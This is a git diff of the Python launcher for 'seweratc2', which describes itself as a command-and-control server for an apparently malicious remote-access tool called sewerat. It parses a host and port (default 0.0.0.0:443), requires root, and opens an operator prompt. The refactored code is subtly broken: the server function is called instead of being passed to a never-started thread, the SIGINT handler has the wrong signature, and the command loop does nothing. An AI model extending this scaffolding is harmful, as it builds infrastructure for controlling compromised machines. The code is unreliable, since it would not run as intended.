@@ -1,83 +1,59 @@
-import threading
-from colorama import Fore, Style
-from secrets import choice
-# Changed to use simpler Python implementation for now.
-from src.server import ThreadedServer, RequestHandler
-from sys import stderr
 import argparse
-import os
+import signal
+import sys
+from queue import Queue
+from threading import Thread
 
-colors = [Fore.LIGHTBLUE_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTRED_EX]
+from program import COLORS, check_root, show_ascii_logo, start_server
+
 
 def get_args():
-  parser = argparse.ArgumentParser(description="A C2 server for sewerat.", prog="seweratc2")
-  parser.add_argument("host", help="The IP address to listen on", metavar="[HOST]", default="0.0.0.0", nargs='?')
-  parser.add_argument("port", help="The port to listen on.", metavar="[PORT]", default=443, action="store", nargs='?')
-  
-  args = parser.parse_args()
-  
-  host = args.host
-  port = args.port
-  
-  return (host, port)
-  
-# check for root perms
-def check_root():
-    if os.getuid() != 0:
-        stderr.write(f"{colors[2]}Error: Please run the script as root!\n")
-        exit(-1)
+    parser = argparse.ArgumentParser(description="A C2 server for sewerat.",
+                                     prog="seweratc2")
+    parser.add_argument("host",
+                        help="The IP address to listen on",
+                        metavar="[HOST]",
+                        default="0.0.0.0",
+                        nargs='?')
+    parser.add_argument("port",
+                        help="The port to listen on.",
+                        metavar="[PORT]",
+                        default=443,
+                        action="store",
+                        nargs='?')
 
-# print a random ascii logo on the screen
-def show_ascii_logo():
-    cpath = os.getcwd()
-    lpath = "/logos/"
-    # choose a random logo
-    logopath = cpath + lpath + choice(os.listdir(cpath + lpath))
-    # print logo if paths exists
-    if os.path.exists(logopath):
-        with open(logopath, "r") as f:
-            print(colors[1] + f.read() + Style.RESET_ALL)
-            return None
-    # write error to stderr
-    stderr.write(f"{colors[2]}Error: Logo not found.\n")
+    args = parser.parse_args()
 
-def load_commands():
-  pass
+    host = args.host
+    port = args.port
 
-def main():  
-    # Check for uid=0
+    return (host, port)
+
+
+def main():
+    # no more stack trace when you hit ctrl-c
+    def handler():
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, handler)
+
     check_root()
-    
+
     host, port = get_args()
     port = int(port)
-        
-    with ThreadedServer((host, port), RequestHandler) as server:
-      ip, port = server.server_address
-      # Starts a 2nd thread for the server, which starts a thread per request.
-      # This is perfect for a C2 server in terms of scaling.
-      server_thread = threading.Thread(target=server.serve_forever)
-      # Exit when main thread does
-      server_thread.daemon = True
-      server_thread.start()
-      
-      show_ascii_logo()
-    
-      print(f"{colors[1]}Starting server on: {host}:{port}")
-      print("Server started!")
-      
-      while True:
-        command = input("sewerat > ").strip()
+    show_ascii_logo()
 
-        
-        if command == "help":
-          print("== HELP ==")
-          for cmd in cmds:
-            print(cmd)
-            
-        elif command == "clear":
-          os.system("clear")
-        elif command == "exit":
-          exit(0)
+    queue = Queue()
+
+    # Spawn server in another thread.
+    Thread(target=start_server(), args={
+        queue,
+    })
+    prompt = "sewerat"
+
+    while True:
+        command = input(f"{COLORS[1]}{prompt} > ").strip()
+
 
 if __name__ == "__main__":
     main()
